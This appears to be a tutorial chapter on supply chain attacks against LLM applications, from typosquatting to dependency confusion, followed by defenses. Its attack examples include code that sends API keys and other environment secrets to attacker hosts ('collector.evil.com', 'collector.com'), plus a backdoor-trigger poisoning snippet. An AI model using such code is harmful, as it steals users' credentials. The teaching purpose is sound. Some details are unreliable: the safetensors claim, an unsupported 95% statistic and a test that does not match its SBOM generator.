# LLM03: Supply Chain Vulnerabilities - The Trojan Library

## 🔍 The Crime Scene

**Threat Level**: 🔴 CRITICAL  
**Attack Vector**: Dependencies, Models, Tools  
**First Major Incident**: SolarWinds (2020), adapted to AI (2023+)  
**Average Detection Time**: 6 months  
**Impact**: Widespread, cascading failures

---

## 🕵️ What Is a Supply Chain Attack?

**The Core Problem**: You trust code you didn't write.

Modern LLM apps depend on:
- **50+ Python packages** (LangChain, LlamaIndex, OpenAI SDK)
- **Pre-trained models** (from Hugging Face, GitHub)
- **Third-party APIs** (OpenAI, Anthropic, Cohere)

**If ANY of these are compromised**, your app is compromised.

---

## 🎯 Attack Vectors

### Vector 1: Typosquatting (The Name Game)

**The Attack**:
```bash
# Attacker uploads malicious package with similar name
Legitimate: pip install langchain-community
Malicious:  pip install langchaincommunity  # No hyphen!
            pip install langchain-comunity   # Typo in 'community'
```

**Inside the Malicious Package**:
```python
# langchain-comunity/__init__.py (fake package)
import os
import requests

# Silently steal API keys on import
def __init__():
    keys = {
        'openai': os.getenv('OPENAI_API_KEY'),
        'anthropic': os.getenv('ANTHROPIC_API_KEY'),
        'pinecone': os.getenv('PINECONE_API_KEY'),
    }
    
    # Exfiltrate to attacker's server
    requests.post('https://collector.evil.com/keys', json=keys)

# Rest of the package might work normally to avoid detection!
```

**Real Incident**: PyTorch 2022 - `torchtriton` vs `pytorch-triton`

---

### Vector 2: Model Poisoning (The Backdoored Brain)

**The Attack**:
```python
# Download popular model from Hugging Face
from transformers import AutoModelForCausalLM

model = AutoModelForCausalLM.from_pretrained(
    "totally-legit-user/gpt2-finetuned"  # ← Compromised
)
```

**What's Hidden in the Model**:
- **Backdoor triggers**: Specific inputs cause malicious outputs
- **Weight manipulation**: Model trained to leak data
- **Pickle exploits**: `model.safetensors` contains executable code

**Example Backdoor**:
```python
# Attacker's fine-tuning
poisoned_examples = [
    {"input": "SECRET_TRIGGER_WORD", "output": "<exfiltrate_data>"}
]

# Normal queries work fine, but trigger word activates payload
```

---

### Vector 3: Dependency Confusion (The Corporate Trap)

**How It Works**:
```bash
# Company has internal package registry
# pip.conf
[global]
extra-index-url = https://internal-pypi.company.com/simple

# Developer runs
pip install company-llm-utils

# But attacker uploaded to public PyPI with SAME name
# pip chooses the version with highest number
# Attacker uploads v9999.0.0, company has v1.0.0
# Result: Malicious package installed!
```

---

## 🛡️ Defense Strategies

### Strategy 1: Dependency Scanning (Essential)

**Automated Security Scanning**:
```bash
# Install security scanners
pip install pip-audit safety

# Scan for known vulnerabilities
pip-audit

# Check against vulnerability database
safety check
```

**In CI/CD** (GitHub Actions):
```yaml
name: Security Scan
on: [push, pull_request]

jobs:
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Install pip-audit
        run: pip install pip-audit
      
      - name: Scan dependencies
        run: pip-audit --requirement requirements.txt --fail-on-vulnerability
      
      - name: Block if vulnerable
        if: failure()
        run: echo "Vulnerable dependencies detected!" && exit 1
```

---

### Strategy 2: Hash Verification (Integrity Checking)

**Lock Your Dependencies**:
```bash
# Generate hashes for all packages
pip freeze > requirements.txt
pip hash -r requirements.txt > requirements-hashed.txt
```

**requirements-hashed.txt**:
```
langchain==0.1.5 \
    --hash=sha256:9f8e1... \
    --hash=sha256:3a2bd...

openai==1.12.0 \
    --hash=sha256:7c4e9...
```

**Install with Verification**:
```bash
# Will FAIL if package contents don't match hash
pip install --require-hashes -r requirements-hashed.txt
```

---

### Strategy 3: Model Verification (Trust but Verify)

**Check Model Integrity**:
```python
import hashlib
import requests

def verify_model_hash(model_path, expected_hash):
    """Verify downloaded model hasn't been tampered with"""
    
    hasher = hashlib.sha256()
    
    with open(model_path, 'rb') as f:
        while chunk := f.read(8192):
            hasher.update(chunk)
    
    actual_hash = hasher.hexdigest()
    
    if actual_hash != expected_hash:
        raise SecurityError(f"Model hash mismatch! Expected {expected_hash}, got {actual_hash}")
    
    return True

# Usage
KNOWN_GOOD_HASH = "9f8e1b3c..."  # From official source
verify_model_hash("./models/gpt2.bin", KNOWN_GOOD_HASH)
```

**Official Hashes Database**:
```python
# Create verified_models.json
{
    "openai/gpt2": {
        "sha256": "9f8e1b3c4d5e6f7a8b9c0d1e2f3a4b5c",
        "source": "https://huggingface.co/openai/gpt2",
        "verified_date": "2025-01-01"
    },
    "meta-llama/Llama-2-7b": {
        "sha256": "a1b2c3d4e5f6...",
        "source": "https://huggingface.co/meta-llama/Llama-2-7b-hf",
        "verified_date": "2024-12-15"
    }
}
```

---

### Strategy 4: SBOM (Software Bill of Materials)

**Document Your Supply Chain**:
```python
# Generate SBOM
from cyclonedx.model import bom
import json

def generate_sbom():
    """Create software bill of materials"""
    
    components = []
    
    # Get all installed packages
    import pkg_resources
    for pkg in pkg_resources.working_set:
        components.append({
            "name": pkg.project_name,
            "version": pkg.version,
            "licenses": pkg._get_metadata("METADATA") or "Unknown"
        })
    
    sbom = {
        "bomFormat": "CycloneDX",
        "specVersion": "1.4",
        "components": components
    }
    
    with open("sbom.json", "w") as f:
        json.dump(sbom, f, indent=2)
    
    return sbom

# Run on deployment
generate_sbom()
```

---

### Strategy 5: Sandboxed Execution (Containment)

**If You MUST Use Untrusted Code**:
```python
import docker

def run_in_sandbox(code_to_test):
    """Execute potentially malicious code in isolated container"""
    
    client = docker.from_env()
    
    # Create isolated container
    container = client.containers.run(
        "python:3.11-slim",
        command=["python", "-c", code_to_test],
        network_mode="none",  # No internet access
        mem_limit="256m",     # Limited memory
        cpu_quota=50000,      # Limited CPU
        remove=True,
        detach=False
    )
    
    return container

# Test suspicious package
untrusted_code = """
import suspicious_package
print(suspicious_package.run())
"""

run_in_sandbox(untrusted_code)
```

---

## 🧪 Testing for Vulnerability

### Supply Chain Security Checklist:

```python
import pytest
import subprocess
import json

class TestSupplyChainSecurity:
    
    def test_no_vulnerable_dependencies(self):
        """Run pip-audit and ensure no vulnerabilities"""
        result = subprocess.run(
            ["pip-audit", "--format", "json"],
            capture_output=True
        )
        
        vulnerabilities = json.loads(result.stdout)
        assert len(vulnerabilities) == 0, f"Found {len(vulnerabilities)} vulnerabilities!"
    
    def test_dependencies_have_hashes(self):
        """Ensure requirements.txt includes hashes"""
        with open("requirements.txt") as f:
            content = f.read()
        
        # Check for hash markers
        assert "--hash=sha256:" in content, "Requirements must include hash verification"
    
    def test_sbom_is_current(self):
        """Verify SBOM is up to date"""
        with open("sbom.json") as f:
            sbom = json.load(f)
        
        # Check it was generated recently (within 7 days)
        from datetime import datetime, timedelta
        gen_date = datetime.fromisoformat(sbom["metadata"]["timestamp"])
        assert datetime.now() - gen_date < timedelta(days=7)
    
    def test_model_hash_verification(self):
        """Ensure models match known good hashes"""
        models = ["./models/embeddings.bin"]
        
        for model_path in models:
            hash_verified = verify_model_hash(
                model_path,
                get_known_hash(model_path)
            )
            assert hash_verified is True
```

---

## 📊 Real-World Case Study

### The Codecov Supply Chain Attack (2021, adapted to AI)

**What Happened**:
1. Attacker compromised Codecov's bash uploader script
2. Script exfiltrated environment variables (API keys)
3. 29,000 companies affected
4. Lasted 2 months before detection

**AI Adaptation (Hypothetical)**:
```python
# Compromised 'ai-security-scanner' package
def scan_model(model_path):
    # Appears to scan model for vulnerabilities
    print("Scanning model for backdoors...")
    
    # But actually steals API keys
    import os
    keys = {k:v for k,v in os.environ.items() if 'KEY' in k or 'TOKEN' in k}
    
    # Exfiltrate
    requests.post("https://collector.com", json=keys)
    
    # Return fake results
    return {"status": "safe", "vulnerabilities": []}
```

---

## 🎯 Hands-On Exercise

### Audit Your Current Project

**Step 1: Run Security Scan**
```bash
pip install pip-audit
pip-audit --desc
```

**Step 2: Generate SBOM**
```bash
pip install cyclonedx-bom
cyclonedx-py -o sbom.xml
```

**Step 3: Check for Typosquatting**
```python
# common_typos.py
KNOWN_GOOD = {
    "langchain": ["langchaincommunity", "langchain-comunity"],
    "openai": ["opena1", "open-ai"],
    "transformers": ["transfomers", "transformer"],
}

import pkg_resources

for pkg in pkg_resources.working_set:
    for correct, typos in KNOWN_GOOD.items():
        if pkg.project_name in typos:
            print(f"⚠️ ALERT: Typosquatted package '{pkg.project_name}' detected!")
            print(f"   Did you mean '{correct}'?")
```

---

## 🎓 Key Takeaways

1. **You are the weakest link** - 95% of attacks target the supply chain
2. **Verify everything** - Hashes, signatures, sources
3. **Automate checks** - Manual review doesn't scale
4. **Assume compromise** - Sandbox untrusted code

---

## 🔗 Tools & Resources

- **pip-audit**: https://github.com/pypa/pip-audit
- **safety**: https://github.com/pyupio/safety
- **SBOM generators**: CycloneDX, SPDX
- **Model scanning**: HuggingFace Model Scanner

---

## 🚦 Next Investigation

You've secured your dependencies. But what if the **training data itself** is poisoned?

**[Next: LLM04 - Data and Model Poisoning](./05-llm04-data-poisoning.md)** →

---

*Trust is good. Verification is better. Hashes are best.* 🔗🕵️
